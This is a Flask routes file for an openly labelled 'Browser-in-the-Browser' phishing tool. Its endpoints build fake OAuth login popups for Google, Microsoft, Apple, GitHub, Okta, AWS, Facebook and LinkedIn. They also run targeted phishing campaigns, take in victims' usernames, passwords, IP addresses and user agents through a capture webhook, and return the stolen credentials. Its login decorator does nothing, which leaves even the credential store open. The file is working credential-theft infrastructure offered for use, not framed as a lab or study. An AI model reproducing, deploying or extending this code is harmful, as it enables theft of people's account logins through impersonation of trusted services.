"""
Browser-in-the-Browser Phishing - Flask Routes
Advanced phishing with fake browser window popups
"""

from flask import Blueprint, render_template, request, jsonify
from functools import wraps
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

# Simple pass-through decorator (auth handled elsewhere)
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        return f(*args, **kwargs)
    return decorated

try:
    from bitb_phishing import get_bitb_phisher, OAuthProvider, BrowserType
except ImportError:
    get_bitb_phisher = None

bitb_bp = Blueprint('bitb_phishing', __name__, url_prefix='/bitb')


@bitb_bp.route('/')
@login_required
def index():
    """BitB Phishing main page"""
    return render_template('bitb_phishing.html')


@bitb_bp.route('/api/generate', methods=['POST'])
@login_required
def generate_page():
    """Generate BitB phishing page"""
    if not get_bitb_phisher:
        return jsonify({"error": "BitB module not available"}), 500
    
    data = request.get_json()
    provider = data.get('provider')
    browser_type = data.get('browser_type', 'chrome_windows')
    custom_url = data.get('custom_url')
    callback_url = data.get('callback_url')
    
    if not provider:
        return jsonify({"error": "OAuth provider required"}), 400
    
    phisher = get_bitb_phisher()
    
    try:
        provider_enum = OAuthProvider(provider)
        browser_enum = BrowserType(browser_type)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    
    result = phisher.generate_phishing_page(provider_enum, browser_enum, custom_url, callback_url)
    return jsonify(result)


@bitb_bp.route('/api/campaign', methods=['POST'])
@login_required
def create_campaign():
    """Create BitB phishing campaign"""
    if not get_bitb_phisher:
        return jsonify({"error": "BitB module not available"}), 500
    
    data = request.get_json()
    name = data.get('name')
    provider = data.get('provider')
    browser_type = data.get('browser_type', 'chrome_windows')
    targets = data.get('targets', [])
    callback_url = data.get('callback_url')
    
    if not name or not provider:
        return jsonify({"error": "Campaign name and provider required"}), 400
    
    phisher = get_bitb_phisher()
    
    try:
        provider_enum = OAuthProvider(provider)
        browser_enum = BrowserType(browser_type)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    
    campaign_id = phisher.create_campaign(name, provider_enum, browser_enum, targets, callback_url)
    return jsonify({"campaign_id": campaign_id, "name": name})


@bitb_bp.route('/api/campaign/<campaign_id>')
@login_required
def get_campaign(campaign_id):
    """Get campaign details"""
    if not get_bitb_phisher:
        return jsonify({"error": "BitB module not available"}), 500
    
    phisher = get_bitb_phisher()
    campaign = phisher.get_campaign(campaign_id)
    
    if not campaign:
        return jsonify({"error": "Campaign not found"}), 404
    
    return jsonify(campaign)


@bitb_bp.route('/api/campaigns')
@login_required
def list_campaigns():
    """List all campaigns"""
    if not get_bitb_phisher:
        return jsonify({"error": "BitB module not available"}), 500
    
    phisher = get_bitb_phisher()
    campaigns = phisher.list_campaigns()
    return jsonify({"campaigns": campaigns})


@bitb_bp.route('/api/campaign/<campaign_id>/credentials')
@login_required
def get_credentials(campaign_id):
    """Get captured credentials for campaign"""
    if not get_bitb_phisher:
        return jsonify({"error": "BitB module not available"}), 500
    
    phisher = get_bitb_phisher()
    credentials = phisher.get_captured_credentials(campaign_id)
    return jsonify({"credentials": credentials})


@bitb_bp.route('/api/capture', methods=['POST'])
@login_required
def capture_credentials():
    """Capture credentials (webhook endpoint)"""
    if not get_bitb_phisher:
        return jsonify({"error": "BitB module not available"}), 500
    
    data = request.get_json()
    campaign_id = data.get('campaign_id')
    username = data.get('username')
    password = data.get('password')
    user_agent = request.headers.get('User-Agent', '')
    ip_address = request.remote_addr
    
    if not all([campaign_id, username, password]):
        return jsonify({"error": "Missing credentials"}), 400
    
    phisher = get_bitb_phisher()
    result = phisher.capture_credentials(campaign_id, username, password, user_agent, ip_address)
    return jsonify(result)


@bitb_bp.route('/api/providers')
@login_required
def get_providers():
    """Get available OAuth providers"""
    providers = [
        {"id": "google", "name": "Google", "icon": "🔴", "color": "#4285F4"},
        {"id": "microsoft", "name": "Microsoft", "icon": "🔵", "color": "#00A4EF"},
        {"id": "apple", "name": "Apple", "icon": "🍎", "color": "#000000"},
        {"id": "github", "name": "GitHub", "icon": "🐙", "color": "#24292E"},
        {"id": "okta", "name": "Okta", "icon": "🔐", "color": "#007DC1"},
        {"id": "aws", "name": "AWS", "icon": "☁️", "color": "#FF9900"},
        {"id": "facebook", "name": "Facebook", "icon": "👤", "color": "#1877F2"},
        {"id": "linkedin", "name": "LinkedIn", "icon": "💼", "color": "#0A66C2"},
    ]
    return jsonify({"providers": providers})


@bitb_bp.route('/api/browsers')
@login_required
def get_browsers():
    """Get available browser templates"""
    browsers = [
        {"id": "chrome_windows", "name": "Chrome (Windows)", "icon": "🪟"},
        {"id": "chrome_macos", "name": "Chrome (macOS)", "icon": "🍎"},
        {"id": "firefox", "name": "Firefox", "icon": "🦊"},
        {"id": "edge", "name": "Edge", "icon": "🌊"},
        {"id": "safari", "name": "Safari", "icon": "🧭"},
    ]
    return jsonify({"browsers": browsers})


@bitb_bp.route('/api/preview', methods=['POST'])
@login_required
def preview_page():
    """Preview BitB page"""
    if not get_bitb_phisher:
        return jsonify({"error": "BitB module not available"}), 500
    
    data = request.get_json()
    provider = data.get('provider')
    browser_type = data.get('browser_type', 'chrome_windows')
    
    if not provider:
        return jsonify({"error": "Provider required"}), 400
    
    phisher = get_bitb_phisher()
    
    try:
        provider_enum = OAuthProvider(provider)
        browser_enum = BrowserType(browser_type)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    
    preview = phisher.generate_preview(provider_enum, browser_enum)
    return jsonify(preview)


@bitb_bp.route('/api/stats')
@login_required
def get_stats():
    """Get overall BitB stats"""
    if not get_bitb_phisher:
        return jsonify({"error": "BitB module not available"}), 500
    
    phisher = get_bitb_phisher()
    stats = phisher.get_stats()
    return jsonify(stats)
